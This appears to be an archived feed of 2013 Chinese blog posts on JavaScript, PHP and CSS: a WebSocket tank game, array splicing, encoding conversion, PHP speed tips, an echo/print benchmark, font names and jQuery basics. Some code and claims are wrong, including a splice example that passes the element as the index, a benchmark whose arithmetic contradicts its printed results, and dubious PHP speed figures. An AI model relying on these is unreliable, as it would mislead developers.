stripe = document.createElement(&quot;div&quot;); stripe.setAttribute(&quot;id&quot;, &quot;stripe&quot;); stripe.style.top = (document.clientHeight - 250) / 2 + &quot;px&quot;; document.body.appendChild(layer); document.body.appendChild(stripe);&#125;*/$(&quot;#gradeA&quot;)[0].innerHTML = $(&quot;#gradeB&quot;)[0].innerHTML = 0;//run_debug();function showMsg(msgContent)&#123; var box = document.createElement(&quot;div&quot;); var msg = document.createElement(&quot;div&quot;); box.setAttribute(&quot;id&quot;, &quot;showMsgBox&quot;); msg.setAttribute(&quot;id&quot;, &quot;msgBox&quot;); with(box.style)&#123; position = &quot;absolute&quot;; top = 0; left = 0; bottom = 0; right = 0; &#125; with(msg.style)&#123; margin = &quot;0 auto&quot;; width = &quot;500px&quot;; height = &quot;400px&quot;; marginTop = &quot;100px&quot;; padding = &quot;55px&quot;; fontSize = &quot;30px&quot;; fontFamily = &quot;微软雅黑&quot;; lineHeight = &quot;40px&quot;; &#125; msg.innerHTML = msgContent || &quot;空&quot;; box.appendChild(msg); document.body.appendChild(box);&#125;showMsg(&quot;&lt;b&gt;[测试版本]&lt;/b&gt;本版本只实现了一半的功能，最终版本是手机控制，并且有音效、登录验证、坦克可以360&amp;deg;旋转，因为需要配置环境，没有公开。左右边界可以穿过，为3D效果。5枪可以搞定一个坦克。&quot; +&quot;&lt;p&gt;按键 ctrl+alt+J 开始&lt;/p&gt;&lt;p&gt;①：WSAD 控制上下左右，J发子弹&lt;/p&gt;&lt;p&gt;②：↑↓←→ 控制上下左右，p发子弹&lt;/p&gt;&quot;)window.onkeydown = function()&#123; if(event.ctrlKey &amp;&amp; event.altKey &amp;&amp; event.keyCode == 74)&#123; $(&quot;#showMsgBox&quot;)[0].style.display = &quot;none&quot;; $(&quot;#msgBox&quot;)[0].style.display = &quot;none&quot;; run_debug(); &#125;&#125;3D Tank JavaScript &lt;/=&gt;&lt;/=&gt;&lt;/=&gt;&lt;/=&gt;&lt;/=&gt; 拆开分析下： ① Tank对象DIY坦克（还行，哈哈哈~）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061var Tank = function(setting)&#123; var opts = setting || &#123;&#125;; this.container = opts.container || forwardF; this.dataset = this.container.getAttribute(&apos;data-num&apos;).split(&quot; &quot;); //....&#125;Tank.prototype = &#123; init: function(tankId, debug)&#123; //.... if(debug)&#123; this.debug = true; this.keySet = debug.keySet; window.addEventListener(&quot;keydown&quot;, function()&#123; this_.move_debug(); &#125;, false); &#125; window.addEventListener(this.stopN, function()&#123; clearInterval(this_.timer); &#125;, false); &#125;, paintTank: function()&#123; //.... &#125;, switchPainter: function(N)&#123; //.... &#125;, direction_debug: function()&#123; //.... &#125;, move_debug: function()&#123; //.... &#125;, ani: function()&#123; //.... &#125;, stopAni: function()&#123; var event = document.createEvent(&apos;HTMLEvents&apos;); event.initEvent(this.stopN, true, true); event.eventName = this.stopN; window.dispatchEvent(event); &#125;, detective: function()&#123; //.... &#125;, detectiveTank: function()&#123; //.... &#125;, shooter: function()&#123; //.... &#125;, destroy: function()&#123; //.... &#125;&#125; 难点在于一些边界的判断，但是好好考虑下也不算什么难点咯~这些代码中应该看到了很多debug之类的变量和函数，因为我写了两种模式，一种是手机端玩，一中是电脑键盘控制（debug模式）。 ②子弹对象 12345678910111213141516171819202122232425/*** @Bullet Tank* @attrs bullet, timer, gap, x, yadsjsw*/var Bullet = function(gA, x, y, tankId)&#123; //....&#125;;Bullet.prototype = &#123; move: function()&#123; //.... &#125;, checkHit: function()&#123; //.... &#125;, hit: function(tTank)&#123; //.... &#125;, destroy: function()&#123; clearInterval(this.timer); if (typeof tanks[this.tankId] != &apos;undefined&apos;) &#123; var tankArr = tanks[this.tankId].bulletBox; tankArr.splice(tankArr.indexOf(this),1); &#125; this.bullet.parentNode &amp;&amp; this.bullet.parentNode.removeChild(this.bullet); &#125;&#125; &nbsp; 和坦克一样，都有一个destroy函数，销毁对象。 ③ 构建AI对象 123456789101112131415161718192021function createRandomTank(obj) &#123; var obj = obj || &#123;cx: 150, cy: 150, color:&quot;#ECFF0B&quot;, bColor:&quot;#ECFF0B&quot;, speed: 1, container: backF&#125;; var rTank = new Tank(obj); rTank.init(String(randomTank)); rTank.shooterTimer = null; rTank.shooterTimer = setInterval(function()&#123; if(Math.random() &gt; 0.8)&#123; rTank.shooter(); &#125; &#125;, 200); rTank.moveTimer = null; rTank.moveTimer = setInterval(function()&#123; if(Math.random() &gt; 0.4)&#123; var ang = Math.PI * 2 * Math.random(); rTank.move.call(rTank, ang); &#125; &#125;, 1200); tanks[randomTank] = rTank; randomTank++;&#125; 机器人是个麻烦的东西，这块虽然不难，销毁他们的时候费了不少力气~~~主要是那么timer要跟着一起销毁。 ④ 构建对象说明 1234tanks[0] = new Tank(&#123;cx: 50, cy: 220, color:&quot;red&quot;, bColor:&quot;red&quot;&#125;);tanks[0].init(&apos;0&apos;, &#123; keySet:debug_keySet[0]&#125;); 这里需要说明一下，只要init后面加了第二个参数，就是调试模式，也就是说键盘是可以控制运行的。 设置了一个全局变量 12 //a w d s j ← ↑ → ↓ pdebug_keySet = [[65, 87, 68, 83, 74], [37, 38, 39, 40, 80]]; 3. socket这块 整个平台信息的交互就是以他为核心，socket这个东西还算比较新，所以学习的时候也没找到太多的资料，只能对着w3c的一些文档边试边做。 123456789101112131415161718192021var socket;function ws_init() &#123; var host = &quot;ws://192.168.86.1:1111/&quot;; // var host = &quot;ws://202.114.20.79:1111/&quot;; try &#123; socket = new WebSocket(host); logMsg(&apos;WebSocket - status &apos;+socket.readyState); socket.onopen = function(msg) &#123; logMsg(&quot;Welcome - status &quot;+this.readyState); send(&apos;display&apos;); &#125;; socket.onclose = function(msg) &#123; logMsg(&quot;Disconnected - status &quot;+this.readyState); &#125;; socket.onmessage = function(msg) &#123; //.... &#125;; &#125; catch(ex) &#123; logMsg(ex); &#125;&#125;function send(msg) &#123; try &#123; socket.send(msg + &apos;=&apos;); &#125; catch(ex) &#123; logMsg(ex); &#125;&#125; socket在前端部分是非常简单的，就是三个事件onopen, onclose, onmessage来驱动，重点还是后台操作，真心麻烦！ 后台部分 后台用的是php，本来打算使用nodeJS，不是十分熟练，24个小时的赛制花太长时间去学习也不现实，所以就用了比较熟悉的php来建立socket连接，还算成功吧。这个部分以后有时间说。先碎觉~~ 最后，别忘了这个DEMO哦，&nbsp;http://qianduannotes.sinaapp.com/3dtank/html/index.html]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[删除数组中的某个元素]]></title>
    <url>%2Fblog%2F2013%2F05%2F31%2F2013-05-31-cb-splice-in-array%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 在之前的文章中也介绍过类似的东西，主要操作的方式是利用splice这个便利函数。我们要删除，Arr数组中的元素b，具体做法是： 1234//第一步是获取b在Arr中的位置var index = Arr.indexOf(b);//第二步就是利用splice删除该元素Arr.splice(b, 1); 简单点写就是： 1Arr.splice(Arr.indexOf(b), 1); //这里的b可以是任意对象 注：并非所有浏览器都支持indexOf这个函数，可能你需要自己写一个遍历函数获取到需要查询元素b的索引值。 下面是我随便写的一个Array对象的扩展： 123456789Array.prototype.index = function(obj)&#123; for(var i = 0, len = this.length; i &lt; len; i++)&#123; if(this[i] === obj) return i; &#125;&#125;Array.prototype.del = function(obj)&#123; this.splice(this.indexOf(obj), 1); return this;&#125; 测试地址：DEMO&nbsp;. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; . &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; . &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; . &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;.]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>splice</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用javascript进行编码转换，GBK转UTF-8]]></title>
    <url>%2Fblog%2F2013%2F05%2F30%2F2013-05-30-cb-gbk-to-utf8-via-javascript%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. DEMO： 1234567891011121314&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;a&quot;&gt;&lt;/div&gt;&lt;script&gt;var script=document.createElement(&apos;script&apos;);script.src=&apos;data:text/javascript;charset=gbk,(function()&#123; window.b=&quot;%c4%e3%ba%c3&quot;; document.getElementById(&quot;a&quot;).innerHTML = window.b;&#125;)()&apos;;document.body.appendChild(script);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 群里交流，大牛们提出来的方案（薛端阳）。这种方式比较奇葩，但相当便捷。 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .详情：http://www.cnblogs.com/xueduanyang/archive/2013/05/30/3108442.html]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>编码转换</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP常用优化]]></title>
    <url>%2Fblog%2F2013%2F05%2F27%2F2013-05-27-cb-php-optimization%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 0、用单引号代替双引号来包含字符串，这样做会更快一些。因为PHP会在双引号包围的字符串中搜寻变量，单引号则不会，注意：只有echo能这么做，它是一种可以把多个字符串当作参数的\函数"（译注：PHP手册中说echo是语言结构，不是真正的函数，故把函数加上了双引号）。 1、如果能将类的方法定义成static，就尽量定义成static，它的速度会提升将近4倍。 2、$row["id"] 的速度是$row[id]的7倍。 3、echo 比 print 快，并且使用echo的多重参数（译注：指用逗号而不是句点）代替字符串连接，比如echo $str1,$str2。 4、在执行for循环之前确定最大循环数，不要每循环一次都计算最大值，最好运用foreach代替。 5、注销那些不用的变量尤其是大数组，以便释放内存。 6、尽量避免使用__get，__set，__autoload。 7、require_once()代价昂贵。 8、include文件时尽量使用绝对路径，因为它避免了PHP去include_path里查找文件的速度，解析操作系统路径所需的时间会更少。 9、如果你想知道脚本开始执行（译注：即服务器端收到客户端请求）的时刻，使用$_SERVER["REQUEST_TIME"]要好于time()。 10、函数代替正则表达式完成相同功能。 11、str_replace函数比preg_replace函数快，但strtr函数的效率是str_replace函数的四倍。 12、如果一个字符串替换函数，www.100jz.net可接受数组或字符作为参数，并且参数长度不太长，那么可以考虑额外写一段替换代码，使得每次传递参数是一个字符，而不是只写一行代码接受数组作为查询和替换的参数。 13、使用选择分支语句（译注：即switch case）好于使用多个if，else if语句。 14、用@屏蔽错误消息的做法非常低效，极其低效。 15、打开apache的mod_deflate模块，可以提高网页的浏览速度。 16、数据库连接当使用完毕时应关掉，不要用长连接。 17、错误消息代价昂贵。 18、在方法中递增局部变量，速度是最快的。几乎与在函数中调用局部变量的速度相当。 19、递增一个全局变量要比递增一个局部变量慢2倍。 20、递增一个对象属性（如：$this-&gt;prop++）要比递增一个局部变量慢3倍。 21、递增一个未预定义的局部变量要比递增一个预定义的局部变量慢9至10倍。 22、仅定义一个局部变量而没在函数中调用它，同样会减慢速度（其程度相当于递增一个局部变量）。PHP大概会检查看是否存在全局变量。 23、方法调用看来与类中定义的方法的数量无关，因为我（在测试方法之前和之后都）添加了10个方法，但性能上没有变化。 24、派生类中的方法运行起来要快于在基类中定义的同样的方法。 25、调用带有一个参数的空函数，其花费的时间相当于执行7至8次的局部变量递增操作。类似的方法调用所花费的时间接近于15次的局部变量递增操作。 26、Apache解析一个PHP脚本的时间要比解析一个静态HTML页面慢2至10倍。尽量多用静态HTML页面，少用脚本。 27、除非脚本可以缓存，否则每次调用时都会重新编译一次。引入一套PHP缓存机制通常可以提升25%至100%的性能，以免除编译开销。 28、尽量做缓存，可使用memcached。memcached是一款高性能的内存对象缓存系统，可用来加速动态Web应用程序，减轻数据库负载。对运算码 (OP code)的缓存很有用，使得脚本不必为每个请求做重新编译。 29、当操作字符串并需要检验其长度是否满足某种要求时，你想当然地会使用strlen()函数。此函数执行起来相当快，因为它不做任何计算，只返回在zval 结构（C的内置数据结构，用于存储PHP变量）中存储的已知字符串长度。但是，由于strlen()是函数，多多少少会有些慢，因为函数调用会经过诸多步骤，如字母小写化（译注：指函数名小写化，PHP不区分函数名大小写）、哈希查找，会跟随被调用的函数一起执行。在某些情况下，你可以使用isset() 技巧加速执行你的代码。 （举例如下） if (strlen($foo) &lt; 5) { echo \Foo is too short"$$ } （与下面的技巧做比较） if (!isset($foo{5})) { echo \Foo is too short"$$ } 调用isset()恰巧比strlen()快，因为与后者不同的是，isset()作为一种语言结构，意味着它的执行不需要函数查找和字母小写化。也就是说，实际上在检验字符串长度的顶层代码中你没有花太多开销。 34、当执行变量$i的递增或递减时，$i++会比++$i慢一些。这种差异是PHP特有的，并不适用于其他语言，所以请不要修改你的C或Java代码并指望它们能立即变快，没用的。++$i更快是因为它只需要3条指令(opcodes)，$i++则需要4条指令。后置递增实际上会产生一个临时变量，这个临时变量随后被递增。而前置递增直接在原值上递增。这是最优化处理的一种，正如Zend的PHP优化器所作的那样。牢记这个优化处理不失为一个好主意，因为并不是所有的指令优化器都会做同样的优化处理，并且存在大量没有装配指令优化器的互联网服务提供商（ISPs）和服务器。 35、并不是事必面向对象(OOP)，面向对象往往开销很大，每个方法和对象调用都会消耗很多内存。 36、并非要用类实现所有的数据结构，数组也很有用。 37、不要把方法细分得过多，仔细想想你真正打算重用的是哪些代码？ 38、当你需要时，你总能把代码分解成方法。 39、尽量采用大量的PHP内置函数。 40、如果在代码中存在大量耗时的函数，你可以考虑用C扩展的方式实现它们。 41、评估检验(profile)你的代码。检验器会告诉你，代码的哪些部分消耗了多少时间。Xdebug调试器包含了检验程序，评估检验总体上可以显示出代码的瓶颈。 42、mod_zip可作为Apache模块，用来即时压缩你的数据，并可让数据传输量降低80%。 43、在可以用file_get_contents替代file、fopen、feof、fgets等系列方法的情况下，尽量用file_get_contents，因为他的效率高得多！但是要注意file_get_contents在打开一个URL文件时候的PHP版本问题； 44、尽量的少进行文件操作，虽然PHP的文件操作效率也不低的； 45、优化Select SQL语句，在可能的情况下尽量少的进行Insert、Update操作(在update上，我被恶批过)； 46、尽可能的使用PHP内部函数（但是我却为了找个PHP里面不存在的函数，浪费了本可以写出一个自定义函数的时间，经验问题啊！）； 47、循环内部不要声明变量，尤其是大变量：对象(这好像不只是PHP里面要注意的问题吧？)； 48、多维数组尽量不要循环嵌套赋值； 49、在可以用PHP内部字符串操作函数的情况下，不要用正则表达式； 50、foreach效率更高，尽量用foreach代替while和for循环； 51、用单引号替代双引号引用字符串； 52、\用i+=1代替i=i+1。符合c/c++的习惯，效率还高"； 53、对global变量，应该用完就unset()掉；]]></content>
      <categories>
        <category>后端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[echo和print效率测试对比]]></title>
    <url>%2Fblog%2F2013%2F05%2F27%2F2013-05-27-cb-echo-print%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 测试代码： 123456789101112131415161718192021222324&lt;?php #echo print 函数效率测试对比 $old = microtime(true); for($i = 0; $i &lt; 10000000; $i++)&#123; echo &quot;1&quot;; &#125; $new = microtime(true); $one = $old - $new; echo $one . &quot;\n&quot;; #echo 函数测试结果 $old = microtime(true); for($i = 0; $i &lt; 10000000; $i++)&#123; print &quot;1&quot;; &#125; $new = microtime(true); $two = $old - $new; echo $two . &quot;\n&quot;; #print 函数测试结果 echo ($two - $one) / $two; #效率比较?&gt; 测试结果： 123$one: 0.35927200317383$two: 0.42829704284668($two - $one) / $two: 0.16116160694007 多次测试，发现echo比print效率高15%左右。 结果分析 echo和print功能上差不多，但是在基层的定义中： 12int print(argument);void echo(string argument1, [, ...string argumentN]); print语句成功输出后，print()会返回1，而echo不返回。&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;]]></content>
      <categories>
        <category>后端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css中font-family的中文字体]]></title>
    <url>%2Fblog%2F2013%2F05%2F26%2F2013-05-26-cb-css-font-family%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 说到css中的font-family，相信很多朋友经常用，但不知道当你遇到引用中文字体的时候你会怎么写？最近特别关注了下，发现最常用的基本有三种类型：1、直接中文；2、英文形式；3、unicode码；前面两种形式很好理解，unicode码是什么意思呢？下面看基本定义:Unicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。 更多内容请查看百度百科对Unicode的介绍。介绍完方案，再谈下使用。之前在看玉伯写的一篇文章《中文字体在 CSS 中的写法》 中提到：font-family中用到的宋体，\用 unicode 表示，不用 SimSun, 是因为 Firefox 的某些版本和 Opera 不支持 SimSun 的写法”。我在网上搜索了下相关内容，大多都是摘抄这篇文章，并没有提到具体哪个版本的Firefox和Opera会不支持英文的写法。对比下，三种方法各有优缺点：中文形式的方便记忆，但在不支持中文的系统或者编码的页面则无法正常显示；英文形式的兼容了系统和编码的问题，但不方便记忆，又可能有潜在的风险；unicode码兼容行最好，但也存在记忆难的问题。综合权衡下，在性能和安全第一的条件下，还是推荐使用unicode码。如果不是太严格的情况下，可以选择其他两种。下面整理下常用的各种字体的不同显示形式，方便使用的时候查找：中文名英文名UnicodeWindows&nbsp;宋体SimSun\5B8B\4F53&nbsp;黑体SimHei\9ED1\4F53&nbsp;微软雅黑Microsoft YaHei\5FAE\8F6F\96C5\9ED1微软正黑体Microsoft JhengHei\5FAE\x8F6F\6B63\9ED1\4F53新宋体NSimSun\65B0\5B8B\4F53新细明体PMingLiU\65B0\7EC6\660E\4F53细明体MingLiU\7EC6\660E\4F53标楷体DFKai-SB\6807\6977\4F53仿宋FangSong\4EFF\5B8B楷体KaiTi\6977\4F53仿宋_GB2312FangSong_GB2312\4EFF\5B8B_GB2312楷体_GB2312KaiTi_GB2312\6977\4F53_GB2312Mac OS&nbsp;华文细黑STHeiti Light [STXihei]\534E\6587\7EC6\9ED1&nbsp;华文黑体STHeiti\534E\6587\9ED1\4F53华文楷体STKaiti\534E\6587\6977\4F53华文宋体STSong\534E\6587\5B8B\4F53华文仿宋STFangsong\534E\6587\4EFF\5B8B丽黑 ProLiHei Pro Medium\4E3D\9ED1 Pro丽宋 ProLiSong Pro Light\4E3D\5B8B Pro标楷体BiauKai\6807\6977\4F53苹果丽中黑Apple LiGothic Medium\82F9\679C\4E3D\4E2D\9ED1苹果丽细宋Apple LiSung Light\82F9\679C\4E3D\7EC6\5B8B上表中标为常用字体 本文转自：http://www.cnblogs.com/jiji262/archive/2012/02/13/2349851.html]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML5学习随笔（1）]]></title>
    <url>%2Fblog%2F2013%2F05%2F24%2F2013-05-24-cb-canvas-clock%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 关键词：HTML5， canvas， 时钟， 入门学习内容：通过制作canvas时钟了解canvas主要方法的使用DEMO：http://qianduannotes.sinaapp.com/test/canvas.html 时钟设计1. Design：2. colors：&nbsp; &nbsp; 表盘：#ABCDEF dialColor&nbsp; &nbsp; 秒钟：red sColor&nbsp; &nbsp; 秒钟原点： gray sDotColor3. size：&nbsp; &nbsp; 画布：400400 panel&nbsp; &nbsp; 表盘：R = 160 &nbsp;dialR&nbsp; &nbsp; 时针刻度：57 hW hH&nbsp; &nbsp; 分针刻度：53 mW mH&nbsp; &nbsp; 时针：10130 hHW hHH&nbsp; &nbsp; 分针：5147 &nbsp;mHW mHH&nbsp; &nbsp; 秒钟：3160 &nbsp;sHW sHH 秒钟原点：r = 5 sDotR4. position&nbsp; &nbsp; 表盘中心：200*200 dialT dialL&nbsp; &nbsp; 秒钟原点中心： 120 &nbsp;sDotP代码 `var clock = document.getElementById(‘clock’);var cxt = clock.getContext(‘2d’); //设置2D制图环境 function draw(){ //清楚画布cxt.clearRect(0, 0, 400, 400);var now = new Date();var sec = now.getSeconds();var min = now.getMinutes();var hour = now.getHours();//小时必须是浮点类型(小时+分数转换成小时)hour = hour+min/60;hour = hour&gt;12?hour-12:hour; //表盘cxt.beginPath();cxt.lineWidth = 10;cxt.strokeStyle = “#ABCDEF”;cxt.arc(200, 200, 160, 0, 360, false);cxt.stroke();cxt.closePath();//刻度//时刻度for(var i = 0;i]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery对象与dom对象相互转换]]></title>
    <url>%2Fblog%2F2013%2F05%2F16%2F2013-05-16-cb-jQuery-object-to-DOM-object%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 刚开始学习jQuery时可能一时会分不清楚哪些是jQuery对象、哪些是DOM对象。至于DOM对象不多解释，我们接触的太多了，下面重点介绍一下jQuery，以及两者相互间的转换。什么是jQuery对象？—就是通过jQuery包装DOM对象后产生的对象。jQuery对象是jQuery独有的，其可以使用jQuery里的方法。比如： 1$(&quot;#test&quot;).html() 意思是指：获取ID为test的元素内的html代码。其中html()是jQuery里的方法这段代码等同于用DOM实现代码： 1document.getElementById(&quot;id&quot;).innerHTML; 虽然jQuery对象是包装DOM对象后产生的，但是jQuery无法使用DOM对象的任何方法，同理DOM对象也不能使用jQuery里的方法.乱使用会报错。比如： 12$(&quot;#test&quot;).innerHTML //错误写法document.getElementById(&quot;id&quot;).html() //错误写法 还有一个要注意的是：用#id作为选择符取得的是jQuery对象与document.getElementById(“id”)得到的DOM对象，这两者并不等价。jQuery对象与DOM对象也可以相互转换。在两者转换前首先我们给一个约定：如果一个获取的是 jQuery对象，那么我们在变量前面加上$，如：var $variab = jQuery对象；如果获取的是DOM对象，则与习惯普通一样：var variab = DOM对象；这么约定只是便于讲解与区别，实际使用中并不规定。 jQuery对象转成DOM对象 两种转换方式将一个jQuery对象转换成DOM对象：[index]和.get(index);(1)jQuery对象是一个数据对象，可以通过[index]的方法，来得到相应的DOM对象。 123var $v =$(&quot;#v&quot;) ; //jQuery对象var v=$v[0]; //DOM对象alert(v.checked) //检测这个checkbox是否被选中 (2)jQuery本身提供，通过.get(index)方法，得到相应的DOM对象 123var $v=$(&quot;#v&quot;); //jQuery对象var v=$v.get(0); //DOM对象alert(v.checked) //检测这个checkbox是否被选中 DOM对象转成jQuery对象 对于已经是一个DOM对象，只需要用$()把DOM对象包装起来，就可以获得一个jQuery对象了。$(DOM对象) 12var v=document.getElementById(&quot;v&quot;); //DOM对象var $v=$(v); //jQuery对象 转换后，就可以任意使用jQuery的方法了。通过以上方法，可以任意的相互转换jQuery对象和DOM对象。注：DOM对象才能使用DOM中的方法，jQuery对象是不可以用DOM中的方法。 * 参考链接：http://www.chinaz.com/design/2010/0309/108144.shtml]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实现Javascript异步编程的4种方法]]></title>
    <url>%2Fblog%2F2013%2F05%2F14%2F2013-05-14-cb-four-method-to-Asynchronous%2F</url>
